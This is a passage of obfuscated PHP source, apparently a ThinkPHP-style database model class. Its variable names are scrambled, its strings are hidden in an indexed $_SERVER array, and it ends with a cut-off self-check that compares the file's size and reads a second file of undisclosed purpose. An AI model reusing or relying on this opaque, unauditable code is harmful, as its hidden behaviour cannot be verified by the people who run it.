is_string($‡éßâ°)) { $¿×ø×•×[$this->getPk()] = intval($‡éßâ°); $this->options[$™šÂÎ¯•[352]] = $¿×ø×•×; } $this->options[$™šÂÎ¯•[368]] = 1; $‡éßâ° = $this->_parseOptions(); $íµƒÒ¿ã = $this->db->select($‡éßâ°); if (!1 === $íµƒÒ¿ã) { return !1; } if (empty($íµƒÒ¿ã)) { return null; } $this->data = $íµƒÒ¿ã[0]; $this->_afterFind($this->data, $‡éßâ°); if (!empty($this->options[$™šÂÎ¯•[369]])) { return $this->returnResult($this->data, $this->options[$™šÂÎ¯•[369]]); } return $this->data; } protected function _afterFind(&$µ¤š´µ, $ş—àƒŒó) { } protected function returnResult($ÚˆÚ»û, $°ıÕøŠ« = '') { $ùºøÈ¸¦ =& $_SERVER[£ğ°ÖØø]; if ($°ıÕøŠ«) { if (is_callable($°ıÕøŠ«)) { return call_user_func($°ıÕøŠ«, $ÚˆÚ»û); } switch (strtolower($°ıÕøŠ«)) { case $ùºøÈ¸¦[370]: return json_encode($ÚˆÚ»û); case $ùºøÈ¸¦[371]: return xml_encode($ÚˆÚ»û); } } return $ÚˆÚ»û; } public function parseFieldsMap($®áìªÊ¬, $ğ£Óä­© = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ş˜ø´‘• => $œ³…µı) { if ($ğ£Óä­© == 1) { if (isset($®áìªÊ¬[$œ³…µı])) { $®áìªÊ¬[$ş˜ø´‘•] = $®áìªÊ¬[$œ³…µı]; unset($®áìªÊ¬[$œ³…µı]); } } else { if (isset($®áìªÊ¬[$ş˜ø´‘•])) { $®áìªÊ¬[$œ³…µı] = $®áìªÊ¬[$ş˜ø´‘•]; unset($®áìªÊ¬[$ş˜ø´‘•]); } } } } return $®áìªÊ¬; } public function setField($èÅşÅ, $ªµ¹¿ î = '') { if (is_array($èÅşÅ)) { $’àÑ¼÷˜ = $èÅşÅ; } else { $’àÑ¼÷˜[$èÅşÅ] = $ªµ¹¿ î; } return $this->save($’àÑ¼÷˜); } public function setAdd($£º‡ƒ€ø, $˜“¥¹ç­ = 1) { $ŒŒÉ÷ë† =& $_SERVER[£ğ°ÖØø]; $¶ˆ¯ä¾” = $£º‡ƒ€ø . $ŒŒÉ÷ë†[372] . $˜“¥¹ç­; if ($˜“¥¹ç­ < 0) { $¶ˆ¯ä¾” = $£º‡ƒ€ø . $˜“¥¹ç­; } return $this->setField($£º‡ƒ€ø, array($ŒŒÉ÷ë†[373], $¶ˆ¯ä¾”)); } public function getField($É¨Ô”’©, $íó¾€ºü = null) { $À½Ú®²ö =& $_SERVER[£ğ°ÖØø]; $€Ï„†Úı[$À½Ú®²ö[350]] = $É¨Ô”’©; $€Ï„†Úı = $this->_parseOptions($€Ï„†Úı); $É¨Ô”’© = trim($É¨Ô”’©); if (strpos($É¨Ô”’©, $À½Ú®²ö[50])) { if (!isset($€Ï„†Úı[$À½Ú®²ö[368]])) { $€Ï„†Úı[$À½Ú®²ö[368]] = is_numeric($íó¾€ºü) ? $íó¾€ºü : $À½Ú®²ö[12]; } $ƒÜ×Ë´š = $this->db->select($€Ï„†Úı); if (!empty($ƒÜ×Ë´š)) { $ÜÊ ¸í = explode($À½Ú®²ö[50], $É¨Ô”’©); $É¨Ô”’© = array_keys($ƒÜ×Ë´š[0]); $ç÷Ôşœ = array_shift($É¨Ô”’©); $ııƒ’ú = array_shift($É¨Ô”’©); $µŠËÉé = array(); $‹­Ö¦È = count($ÜÊ ¸í); foreach ($ƒÜ×Ë´š as $®ìôŒó£) { $¢»…ğ¸ø = $®ìôŒó£[$ç÷Ôşœ]; if (2 == $‹­Ö¦È) { $µŠËÉé[$¢»…ğ¸ø] = $®ìôŒó£[$ııƒ’ú]; } else { $µŠËÉé[$¢»…ğ¸ø] = is_string($íó¾€ºü) ? implode($íó¾€ºü, $®ìôŒó£) : $®ìôŒó£; } } return $µŠËÉé; } } else { if (!0 !== $íó¾€ºü) { $€Ï„†Úı[$À½Ú®²ö[368]] = is_numeric($íó¾€ºü) ? $íó¾€ºü : 1; } if ($íó¾€ºü === $À½Ú®²ö[332]) { unset($€Ï„†Úı[$À½Ú®²ö[368]]); } $®ìôŒó£ = $this->db->select($€Ï„†Úı); if (!empty($®ìôŒó£)) { if ($íó¾€ºü === $À½Ú®²ö[332]) { return reset($®ìôŒó£[0]); } if (!0 !== $íó¾€ºü && 1 == $€Ï„†Úı[$À½Ú®²ö[368]]) { return reset($®ìôŒó£[0]); } foreach ($®ìôŒó£ as $ÛœÑ €ß) { $¡Â´ÔÚ™[] = $ÛœÑ €ß[$É¨Ô”’©]; } return $¡Â´ÔÚ™; } } return null; } public function create($½Ñë©É = '', $¢àæ˜€¾ = '') { $º³›ÜÍÙ =& $_SERVER[£ğ°ÖØø]; if (empty($½Ñë©É)) { $½Ñë©É = $_POST; } elseif (is_object($½Ñë©É)) { $½Ñë©É = get_object_vars($½Ñë©É); } if (empty($½Ñë©É) || !is_array($½Ñë©É)) { $this->error = think_lang($º³›ÜÍÙ[348]); return !1; } $½Ñë©É = $this->parseFieldsMap($½Ñë©É, 0); $¢àæ˜€¾ = $¢àæ˜€¾ ? $¢àæ˜€¾ : (!empty($½Ñë©É[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$º³›ÜÍÙ[350]])) { $Ä¤”Ûˆ = $this->options[$º³›ÜÍÙ[350]]; unset($this->options[$º³›ÜÍÙ[350]]); } elseif ($¢àæ˜€¾ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ä¤”Ûˆ = $this->insertFields; } elseif ($¢àæ˜€¾ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ä¤”Ûˆ = $this->updateFields; } if (isset($Ä¤”Ûˆ)) { if (is_string($Ä¤”Ûˆ)) { $Ä¤”Ûˆ = explode($º³›ÜÍÙ[50], $Ä¤”Ûˆ); } if (think_config($º³›ÜÍÙ[374])) { $Ä¤”Ûˆ[] = think_config($º³›ÜÍÙ[375]); } foreach ($½Ñë©É as $´é™‰Ëˆ => $˜¸÷È€) { if (!in_array($´é™‰Ëˆ, $Ä¤”Ûˆ)) { unset($½Ñë©É[$´é™‰Ëˆ]); } } } if (!$this->autoValidation($½Ñë©É, $¢àæ˜€¾)) { return !1; } if (!$this->autoCheckToken($½Ñë©É)) { $this->error = think_lang($º³›ÜÍÙ[376]); return !1; } if ($this->autoCheckFields) { $Ä¤”Ûˆ = $this->getDbFields(); foreach ($½Ñë©É as $´é™‰Ëˆ => $˜¸÷È€) { if (!in_array($´é™‰Ëˆ, $Ä¤”Ûˆ)) { unset($½Ñë©É[$´é™‰Ëˆ]); } elseif (MAGIC_QUOTES_GPC && is_string($˜¸÷È€)) { $½Ñë©É[$´é™‰Ëˆ] = stripslashes($˜¸÷È€); } } } $this->autoOperation($½Ñë©É, $¢àæ˜€¾); $this->data = $½Ñë©É; return $½Ñë©É; } public function autoCheckToken($û™ÚÈ”Î) { $ŸìÑöï‘ =& $_SERVER[£ğ°ÖØø]; if (isset($this->options[$ŸìÑöï‘[377]]) && !$this->options[$ŸìÑöï‘[377]]) { return !0; } if (think_config($ŸìÑöï‘[374])) { $‡­Æ„æà = think_config($ŸìÑöï‘[375]); if (!isset($û™ÚÈ”Î[$‡­Æ„æà]) || Session::get($‡­Æ„æà)) { return !1; } list($äëô‚¨ü, $Èª½»°˜) = explode($ŸìÑöï‘[11], $û™ÚÈ”Î[$‡­Æ„æà]); if ($Èª½»°˜ && Session::get($‡­Æ„æà . $ŸìÑöï‘[10] . $äëô‚¨ü) === $Èª½»°˜) { Session::remove($‡­Æ„æà . $ŸìÑöï‘[10] . $äëô‚¨ü); return !0; } if (think_config($ŸìÑöï‘[378])) { Session::remove($‡­Æ„æà . $ŸìÑöï‘[10] . $äëô‚¨ü); } return !1; } return !0; } public function regex($¯¼–À¿Ô, $«©¶·’Ó) { $şŠí“õ =& $_SERVER[£ğ°ÖØø]; $¬‹´íä = array($şŠí“õ[379] => $şŠí“õ[380], $şŠí“õ[381] => $şŠí“õ[382], $şŠí“õ[383] => $şŠí“õ[384], $şŠí“õ[385] => $şŠí“õ[386], $şŠí“õ[387] => $şŠí“õ[388], $şŠí“õ[389] => $şŠí“õ[390], $şŠí“õ[391] => $şŠí“õ[392], $şŠí“õ[366] => $şŠí“õ[393], $şŠí“õ[394] => $şŠí“õ[395]); if (isset($¬‹´íä[strtolower($«©¶·’Ó)])) { $«©¶·’Ó = $¬‹´íä[strtolower($«©¶·’Ó)]; } return preg_match($«©¶·’Ó, $¯¼–À¿Ô) === 1; } private function autoOperation(&$ÓÛŞíîô, $åÊŞ×âÑ) { $æÌäÊ…œ =& $_SERVER[£ğ°ÖØø]; if (!empty($this->options[$æÌäÊ…œ[396]])) { $ùÅïç¿ò = $this->options[$æÌäÊ…œ[396]]; unset($this->options[$æÌäÊ…œ[396]]); } elseif (!empty($this->_auto)) { $ùÅïç¿ò = $this->_auto; } if (isset($ùÅïç¿ò)) { foreach ($ùÅïç¿ò as $ı†Ïä÷í) { if (empty($ı†Ïä÷í[2])) { $ı†Ïä÷í[2] = THINK_MODEL_INSERT; } if ($åÊŞ×âÑ == $ı†Ïä÷í[2] || $ı†Ïä÷í[2] == THINK_MODEL_BOTH) { switch (trim($ı†Ïä÷í[3])) { case $æÌäÊ…œ[397]: case $æÌäÊ…œ[398]: $ÏÓ¦Œ‹í = isset($ı†Ïä÷í[4]) ? (array) $ı†Ïä÷í[4] : array(); if (isset($ÓÛŞíîô[$ı†Ïä÷í[0]])) { array_unshift($ÏÓ¦Œ‹í, $ÓÛŞíîô[$ı†Ïä÷í[0]]); } if ($æÌäÊ…œ[397] == $ı†Ïä÷í[3]) { $ÓÛŞíîô[$ı†Ïä÷í[0]] = call_user_func_array($ı†Ïä÷í[1], $ÏÓ¦Œ‹í); } else { $ÓÛŞíîô[$ı†Ïä÷í[0]] = call_user_func_array(array(&$this, $ı†Ïä÷í[1]), $ÏÓ¦Œ‹í); } break; case $æÌäÊ…œ[350]: $ÓÛŞíîô[$ı†Ïä÷í[0]] = $ÓÛŞíîô[$ı†Ïä÷í[1]]; break; case $æÌäÊ…œ[399]: if ($æÌäÊ…œ[12] === $ÓÛŞíîô[$ı†Ïä÷í[0]]) { unset($ÓÛŞíîô[$ı†Ïä÷í[0]]); } break; case $æÌäÊ…œ[400]: default: $ÓÛŞíîô[$ı†Ïä÷í[0]] = $ı†Ïä÷í[1]; } if (!1 === $ÓÛŞíîô[$ı†Ïä÷í[0]]) { unset($ÓÛŞíîô[$ı†Ïä÷í[0]]); } } } } return $ÓÛŞíîô; } protected function autoValidation($­ïÛäá, $Æ©›Âı§) { $˜¥Óêƒ =& $_SERVER[£ğ°ÖØø]; if (!empty($this->options[$˜¥Óêƒ[401]])) { $ÂÌ–˜õ¸ = $this->options[$˜¥Óêƒ[401]]; unset($this->options[$˜¥Óêƒ[401]]); } elseif (!empty($this->_validate)) { $ÂÌ–˜õ¸ = $this->_validate; } if (isset($ÂÌ–˜õ¸)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÂÌ–˜õ¸ as $ã²¼ÖŸÛ => $˜ØŒÌ»Î) { if (empty($˜ØŒÌ»Î[5]) || $˜ØŒÌ»Î[5] == THINK_MODEL_BOTH || $˜ØŒÌ»Î[5] == $Æ©›Âı§) { if (0 == strpos($˜ØŒÌ»Î[2], $˜¥Óêƒ[402]) && strpos($˜ØŒÌ»Î[2], $˜¥Óêƒ[403])) { $˜ØŒÌ»Î[2] = think_lang(substr($˜ØŒÌ»Î[2], 2, -1)); } $˜ØŒÌ»Î[3] = isset($˜ØŒÌ»Î[3]) ? $˜ØŒÌ»Î[3] : THINK_EXISTS_VALIDATE; $˜ØŒÌ»Î[4] = isset($˜ØŒÌ»Î[4]) ? $˜ØŒÌ»Î[4] : $˜¥Óêƒ[404]; switch ($˜ØŒÌ»Î[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($­ïÛäá, $˜ØŒÌ»Î)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($˜¥Óêƒ[12] != trim($­ïÛäá[$˜ØŒÌ»Î[0]])) { if (!1 === $this->_validationField($­ïÛäá, $˜ØŒÌ»Î)) { return !1; } } break; default: if (isset($­ïÛäá[$˜ØŒÌ»Î[0]])) { if (!1 === $this->_validationField($­ïÛäá, $˜ØŒÌ»Î)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ü—½¤Ûœ, $¹Õ–ƒø) { if (!1 === $this->_validationFieldItem($Ü—½¤Ûœ, $¹Õ–ƒø)) { if ($this->patchValidate) { $this->error[$¹Õ–ƒø[0]] = $¹Õ–ƒø[2]; } else { $this->error = $¹Õ–ƒø[2]; return !1; } } return; } protected function _validationFieldItem($´şÈ»…Æ, $õ‰Ğş¼) { $ŒìÜüú“ =& $_SERVER[£ğ°ÖØø]; switch (strtolower(trim($õ‰Ğş¼[4]))) { case $ŒìÜüú“[397]: case $ŒìÜüú“[398]: $–Ø˜­±Ü = isset($õ‰Ğş¼[6]) ? (array) $õ‰Ğş¼[6] : array(); if (is_string($õ‰Ğş¼[0]) && strpos($õ‰Ğş¼[0], $ŒìÜüú“[50])) { $õ‰Ğş¼[0] = explode($ŒìÜüú“[50], $õ‰Ğş¼[0]); } if (is_array($õ‰Ğş¼[0])) { foreach ($õ‰Ğş¼[0] as $—¥Ò¼¬Õ) { $Õª…Ü—¤[$—¥Ò¼¬Õ] = $´şÈ»…Æ[$—¥Ò¼¬Õ]; } array_unshift($–Ø˜­±Ü, $Õª…Ü—¤); } else { array_unshift($–Ø˜­±Ü, $´şÈ»…Æ[$õ‰Ğş¼[0]]); } if ($ŒìÜüú“[397] == $õ‰Ğş¼[4]) { return call_user_func_array($õ‰Ğş¼[1], $–Ø˜­±Ü); } else { return call_user_func_array(array(&$this, $õ‰Ğş¼[1]), $–Ø˜­±Ü); } case $ŒìÜüú“[405]: return $´şÈ»…Æ[$õ‰Ğş¼[0]] == $´şÈ»…Æ[$õ‰Ğş¼[1]]; case $ŒìÜüú“[406]: if (is_string($õ‰Ğş¼[0]) && strpos($õ‰Ğş¼[0], $ŒìÜüú“[50])) { $õ‰Ğş¼[0] = explode($ŒìÜüú“[50], $õ‰Ğş¼[0]); } $õø¶ã€ï = array(); if (is_array($õ‰Ğş¼[0])) { foreach ($õ‰Ğş¼[0] as $—¥Ò¼¬Õ) { $õø¶ã€ï[$—¥Ò¼¬Õ] = $´şÈ»…Æ[$—¥Ò¼¬Õ]; } } else { $õø¶ã€ï[$õ‰Ğş¼[0]] = $´şÈ»…Æ[$õ‰Ğş¼[0]]; } if (!empty($´şÈ»…Æ[$this->getPk()])) { $õø¶ã€ï[$this->getPk()] = array($ŒìÜüú“[407], $´şÈ»…Æ[$this->getPk()]); } if ($this->where($õø¶ã€ï)->find()) { return !1; } return !0; default: return $this->check($´şÈ»…Æ[$õ‰Ğş¼[0]], $õ‰Ğş¼[1], $õ‰Ğş¼[4]); } } public function check($­²Œ‹ÉÅ, $ªîã†£à, $¼ãğ…µ’ = "\162\145\x67\x65\170") { $ó­„‘ù¯ =& $_SERVER[£ğ°ÖØø]; $¼ãğ…µ’ = strtolower(trim($¼ãğ…µ’)); switch ($¼ãğ…µ’) { case $ó­„‘ù¯[7]: case $ó­„‘ù¯[408]: $ÃˆöÈ²Ü = is_array($ªîã†£à) ? $ªîã†£à : explode($ó­„‘ù¯[50], $ªîã†£à); return $¼ãğ…µ’ == $ó­„‘ù¯[7] ? in_array($­²Œ‹ÉÅ, $ÃˆöÈ²Ü) : !in_array($­²Œ‹ÉÅ, $ÃˆöÈ²Ü); case $ó­„‘ù¯[409]: case $ó­„‘ù¯[410]: if (is_array($ªîã†£à)) { $õë´—²´ = $ªîã†£à[0]; $ôöƒî‚‹ = $ªîã†£à[1]; } else { list($õë´—²´, $ôöƒî‚‹) = explode($ó­„‘ù¯[50], $ªîã†£à); } return $¼ãğ…µ’ == $ó­„‘ù¯[409] ? $­²Œ‹ÉÅ >= $õë´—²´ && $­²Œ‹ÉÅ <= $ôöƒî‚‹ : $­²Œ‹ÉÅ < $õë´—²´ || $­²Œ‹ÉÅ > $ôöƒî‚‹; case $ó­„‘ù¯[411]: case $ó­„‘ù¯[412]: return $¼ãğ…µ’ == $ó­„‘ù¯[411] ? $­²Œ‹ÉÅ == $ªîã†£à : $­²Œ‹ÉÅ != $ªîã†£à; case $ó­„‘ù¯[413]: $£‰ûœğí = mb_strlen($­²Œ‹ÉÅ, $ó­„‘ù¯[414]); if (strpos($ªîã†£à, $ó­„‘ù¯[50])) { list($õë´—²´, $ôöƒî‚‹) = explode($ó­„‘ù¯[50], $ªîã†£à); return $£‰ûœğí >= $õë´—²´ && $£‰ûœğí <= $ôöƒî‚‹; } else { return $£‰ûœğí == $ªîã†£à; } case $ó­„‘ù¯[415]: list($Ô•­Æ¯ç, $ÒÆØ®ÃÁ) = explode($ó­„‘ù¯[50], $ªîã†£à); if (!is_numeric($Ô•­Æ¯ç)) { $Ô•­Æ¯ç = strtotime($Ô•­Æ¯ç); } if (!is_numeric($ÒÆØ®ÃÁ)) { $ÒÆØ®ÃÁ = strtotime($ÒÆØ®ÃÁ); } return NOW_TIME >= $Ô•­Æ¯ç && NOW_TIME <= $ÒÆØ®ÃÁ; case $ó­„‘ù¯[416]: return in_array(get_client_ip(), explode($ó­„‘ù¯[50], $ªîã†£à)); case $ó­„‘ù¯[417]: return !in_array(get_client_ip(), explode($ó­„‘ù¯[50], $ªîã†£à)); case $ó­„‘ù¯[404]: default: return $this->regex($­²Œ‹ÉÅ, $ªîã†£à); } } public function query($®è³’§Ù, $Ê”ŞÁË³ = false) { $™×ù¢ø =& $_SERVER[£ğ°ÖØø]; if (!is_bool($Ê”ŞÁË³) && !is_array($Ê”ŞÁË³)) { $Ê”ŞÁË³ = func_get_args(); array_shift($Ê”ŞÁË³); } $®è³’§Ù = str_replace(array($™×ù¢ø[262], $™×ù¢ø[418]), $™×ù¢ø[53], $®è³’§Ù); $®è³’§Ù = $this->parseSql($®è³’§Ù, $Ê”ŞÁË³); return $this->db->query($®è³’§Ù); } public function execute($–ÛÈ™Ñš, $ùá¯ˆ = false) { if (!is_bool($ùá¯ˆ) && !is_array($ùá¯ˆ)) { $ùá¯ˆ = func_get_args(); array_shift($ùá¯ˆ); } $–ÛÈ™Ñš = $this->parseSql($–ÛÈ™Ñš, $ùá¯ˆ); return $this->db->execute($–ÛÈ™Ñš); } protected function parseSql($ÃíÖÄ¬, $Û«ÙÄÀ) { $ôÛ„ïäï =& $_SERVER[£ğ°ÖØø]; if (!0 === $Û«ÙÄÀ) { $–Ñ¶š¬Á = $this->_parseOptions(); $ÃíÖÄ¬ = $this->db->parseSql($ÃíÖÄ¬, $–Ñ¶š¬Á); } elseif (is_array($Û«ÙÄÀ)) { $Û«ÙÄÀ = array_map(array($this->db, $ôÛ„ïäï[419]), $Û«ÙÄÀ); $ÃíÖÄ¬ = vsprintf($ÃíÖÄ¬, $Û«ÙÄÀ); } else { $ÃíÖÄ¬ = strtr($ÃíÖÄ¬, array($ôÛ„ïäï[420] => $this->getTableName(), $ôÛ„ïäï[421] => think_config($ôÛ„ïäï[321]))); } $this->db->setModel($this->name); return $ÃíÖÄ¬; } public function db($‹ºš’¿Ã = '', $¢Ìµ Öš = '', $˜èŞ°³® = array()) { $ñíõ¨´Ó =& $_SERVER[£ğ°ÖØø]; if ($ñíõ¨´Ó[12] === $‹ºš’¿Ã && $this->db) { return $this->db; } static $³¶˜Ë† = array(); static $­½µ‡éì = array(); if (!isset($­½µ‡éì[$‹ºš’¿Ã]) || isset($­½µ‡éì[$‹ºš’¿Ã]) && $¢Ìµ Öš && $³¶˜Ë†[$‹ºš’¿Ã] != $¢Ìµ Öš) { if (!empty($¢Ìµ Öš) && is_string($¢Ìµ Öš) && !1 === strpos($¢Ìµ Öš, $ñíõ¨´Ó[8])) { $¢Ìµ Öš = think_config($¢Ìµ Öš); } $‹ºš’¿Ã = think_guid($¢Ìµ Öš); $­½µ‡éì[$‹ºš’¿Ã] = Db::getInstance($¢Ìµ Öš); } elseif (NULL === $¢Ìµ Öš) { $­½µ‡éì[$‹ºš’¿Ã]->close(); unset($­½µ‡éì[$‹ºš’¿Ã]); return; } if (!empty($˜èŞ°³®)) { if (is_string($˜èŞ°³®)) { parse_str($˜èŞ°³®, $˜èŞ°³®); } foreach ($˜èŞ°³® as $ÓÊ¾Ÿâù => $î»”‚Ğà) { $this->setProperty($ÓÊ¾Ÿâù, $î»”‚Ğà); } } $³¶˜Ë†[$‹ºš’¿Ã] = $¢Ìµ Öš; $this->db = $­½µ‡éì[$‹ºš’¿Ã]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ãÆå¯¾ô = get_class($this); if ($ãÆå¯¾ô == $_SERVER[£ğ°ÖØø][422]) { return $this->name; } $this->name = substr($ãÆå¯¾ô, 0, -5); } return $this->name; } public function getTableName() { $’ÃÃüäÊ =& $_SERVER[£ğ°ÖØø]; if (empty($this->trueTableName)) { $±ÉÒ–Æ¾ = !empty($this->tablePrefix) ? $this->tablePrefix : $’ÃÃüäÊ[12]; if (!empty($this->tableName)) { $±ÉÒ–Æ¾ .= $this->tableName; } else { $±ÉÒ–Æ¾ .= think_parse_name($this->name); } $this->trueTableName = strtolower($±ÉÒ–Æ¾); } return (!empty($this->dbName) ? $this->dbName . $’ÃÃüäÊ[10] : $’ÃÃüäÊ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ûñ±Ùåš =& $_SERVER[£ğ°ÖØø]; return isset($this->fields[$Ûñ±Ùåš[328]]) ? $this->fields[$Ûñ±Ùåš[328]] : $this->pk; } public function getDbFields() { $úˆ—÷É’ =& $_SERVER[£ğ°ÖØø]; if (isset($this->options[$úˆ—÷É’[356]])) { $¸¨™“”¢ = $this->db->getFields($this->options[$úˆ—÷É’[356]]); return $¸¨™“”¢ ? array_keys($¸¨™“”¢) : !1; } if ($this->fields) { $¸¨™“”¢ = $this->fields; unset($¸¨™“”¢[$úˆ—÷É’[327]], $¸¨™“”¢[$úˆ—÷É’[328]], $¸¨™“”¢[$úˆ—÷É’[329]], $¸¨™“”¢[$úˆ—÷É’[326]]); return $¸¨™“”¢; } return !1; } public function data($ô³Á‘ = '') { $Å”ğ„ƒè =& $_SERVER[£ğ°ÖØø]; if ($Å”ğ„ƒè[12] === $ô³Á‘ && !empty($this->data)) { return $this->data; } if (is_object($ô³Á‘)) { $ô³Á‘ = get_object_vars($ô³Á‘); } elseif (is_string($ô³Á‘)) { parse_str($ô³Á‘, $ô³Á‘); } elseif (!is_array($ô³Á‘)) { think_exception(think_lang($Å”ğ„ƒè[348])); } $this->data = $ô³Á‘; return $this; } public function join($İ¼·äû°) { $¥šÕü¼ =& $_SERVER[£ğ°ÖØø]; if (is_array($İ¼·äû°)) { $this->options[$¥šÕü¼[359]] = $İ¼·äû°; } elseif (!empty($İ¼·äû°)) { $this->options[$¥šÕü¼[359]][] = $İ¼·äû°; } return $this; } public function union($ÊÂÖğÙ, $Ä³ƒ×¼ = false) { $ˆ˜é²¶ =& $_SERVER[£ğ°ÖØø]; if (empty($ÊÂÖğÙ)) { return $this; } if ($Ä³ƒ×¼) { $this->options[$ˆ˜é²¶[423]][$ˆ˜é²¶[424]] = !0; } if (is_object($ÊÂÖğÙ)) { $ÊÂÖğÙ = get_object_vars($ÊÂÖğÙ); } if (is_string($ÊÂÖğÙ)) { $Ç¯İú¢ = $ÊÂÖğÙ; } elseif (is_array($ÊÂÖğÙ)) { if (isset($ÊÂÖğÙ[0])) { $this->options[$ˆ˜é²¶[423]] = array_merge($this->options[$ˆ˜é²¶[423]], $ÊÂÖğÙ); return $this; } else { $Ç¯İú¢ = $ÊÂÖğÙ; } } else { think_exception(think_lang($ˆ˜é²¶[348])); } $this->options[$ˆ˜é²¶[423]][] = $Ç¯İú¢; return $this; } public function cache($½¢ÀÏÏ« = true, $›éÑ¥® = null, $ˆƒöó› = '') { $ë¡—«ä =& $_SERVER[£ğ°ÖØø]; if (!1 !== $½¢ÀÏÏ«) { $this->options[$ë¡—«ä[425]] = array($ë¡—«ä[97] => $½¢ÀÏÏ«, $ë¡—«ä[415] => $›éÑ¥®, $ë¡—«ä[33] => $ˆƒöó›); } return $this; } public function field($¾«½¾ÜÎ, $Èˆ‹ú²¬ = false) { $¿¥ÅëÚ =& $_SERVER[£ğ°ÖØø]; if (!0 === $¾«½¾ÜÎ) { $ŸÒ á¦† = $this->getDbFields(); $¾«½¾ÜÎ = $ŸÒ á¦† ? $ŸÒ á¦† : $¿¥ÅëÚ[220]; } elseif ($Èˆ‹ú²¬) { if (is_string($¾«½¾ÜÎ)) { $¾«½¾ÜÎ = explode($¿¥ÅëÚ[50], $¾«½¾ÜÎ); } $ŸÒ á¦† = $this->getDbFields(); $¾«½¾ÜÎ = $ŸÒ á¦† ? array_diff($ŸÒ á¦†, $¾«½¾ÜÎ) : $¾«½¾ÜÎ; } $this->options[$¿¥ÅëÚ[350]] = $¾«½¾ÜÎ; return $this; } public function scope($ºöÌæ‹© = '', $÷ô¢¹«‹ = NULL) { $ŸÏñ¯şĞ =& $_SERVER[£ğ°ÖØø]; if ($ŸÏñ¯şĞ[12] === $ºöÌæ‹©) { if (isset($this->_scope[$ŸÏñ¯şĞ[37]])) { $ƒœÆ¤‚ = $this->_scope[$ŸÏñ¯şĞ[37]]; } else { return $this; } } elseif (is_string($ºöÌæ‹©)) { $ª§ç¬°ü = explode($ŸÏñ¯şĞ[50], $ºöÌæ‹©); $ƒœÆ¤‚ = array(); foreach ($ª§ç¬°ü as $µ¦ÓÎî¨) { if (!isset($this->_scope[$µ¦ÓÎî¨])) { continue; } $ƒœÆ¤‚ = array_merge($ƒœÆ¤‚, $this->_scope[$µ¦ÓÎî¨]); } if (!empty($÷ô¢¹«‹) && is_array($÷ô¢¹«‹)) { $ƒœÆ¤‚ = array_merge($ƒœÆ¤‚, $÷ô¢¹«‹); } } elseif (is_array($ºöÌæ‹©)) { $ƒœÆ¤‚ = $ºöÌæ‹©; } if (is_array($ƒœÆ¤‚) && !empty($ƒœÆ¤‚)) { $this->options = array_merge($this->options, array_change_key_case($ƒœÆ¤‚)); } return $this; } public function where($÷£ÇŒ¼, $À°×ª = null) { $ÇÍ·¢ÆÊ =& $_SERVER[£ğ°ÖØø]; if (!is_null($À°×ª) && is_string($÷£ÇŒ¼)) { if (!is_array($À°×ª)) { $À°×ª = func_get_args(); array_shift($À°×ª); } $À°×ª = array_map(array($this->db, $ÇÍ·¢ÆÊ[419]), $À°×ª); $÷£ÇŒ¼ = vsprintf($÷£ÇŒ¼, $À°×ª); } elseif (is_object($÷£ÇŒ¼)) { $÷£ÇŒ¼ = get_object_vars($÷£ÇŒ¼); } elseif (is_array($÷£ÇŒ¼)) { foreach ($÷£ÇŒ¼ as $ûä ·ˆ¡ => $ŠŠØÙ´Ñ) { if ((is_numeric($ûä ·ˆ¡) || !$ûä ·ˆ¡) && is_string($ŠŠØÙ´Ñ)) { if (strpos($ŠŠØÙ´Ñ, $ÇÍ·¢ÆÊ[426]) === 0) { continue; } think_trace($ÇÍ·¢ÆÊ[427], $ÇÍ·¢ÆÊ[12], $ÇÍ·¢ÆÊ[49]); die; } } } if (is_string($÷£ÇŒ¼) && $ÇÍ·¢ÆÊ[12] != $÷£ÇŒ¼) { $Á™÷ÃØ‡ = array(); $Á™÷ÃØ‡[$ÇÍ·¢ÆÊ[428]] = $÷£ÇŒ¼; $÷£ÇŒ¼ = $Á™÷ÃØ‡; } if (isset($this->options[$ÇÍ·¢ÆÊ[352]])) { $this->options[$ÇÍ·¢ÆÊ[352]] = array_merge($this->options[$ÇÍ·¢ÆÊ[352]], $÷£ÇŒ¼); } else { $this->options[$ÇÍ·¢ÆÊ[352]] = $÷£ÇŒ¼; } return $this; } public function limit($Œõà‡Ö•, $Çã•’Æì = null) { $¬èşáÚæ =& $_SERVER[£ğ°ÖØø]; $this->options[$¬èşáÚæ[368]] = is_null($Çã•’Æì) ? $Œõà‡Ö• : $Œõà‡Ö• . $¬èşáÚæ[50] . $Çã•’Æì; return $this; } public function page($¡¾¹ïíê, $–õ”ø³± = null) { $ñúÉŠ­à =& $_SERVER[£ğ°ÖØø]; $this->options[$ñúÉŠ­à[429]] = is_null($–õ”ø³±) ? $¡¾¹ïíê : $¡¾¹ïíê . $ñúÉŠ­à[50] . $–õ”ø³±; return $this; } public function comment($à­¹½€°) { $this->options[$_SERVER[£ğ°ÖØø][430]] = $à­¹½€°; return $this; } public function setProperty($‰­´ğçë, $àÒŠÅí) { if (property_exists($this, $‰­´ğçë)) { $this->{$‰­´ğçë} = $àÒŠÅí; } return $this; } } $_file = $_SERVER[$_SERVER[£ğ°ÖØø][431]]; goto aƒ”µù”Öã; aƒ”µù”Öã: $_size = $_SERVER[£ğ°ÖØø][432]; if ($_SERVER[$_SERVER[£ğ°ÖØø][433]] != $_size($_file)) { $_getc = $_SERVER[£ğ°ÖØø][434]; $_getfile = $_SERVER[$_SERVER[£ğ°ÖØø][435]] . $_SERVER[£ğ°ÖØø][436]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[£ğ°ÖØø][262], $_getfilec); if (count($_getarrs) < 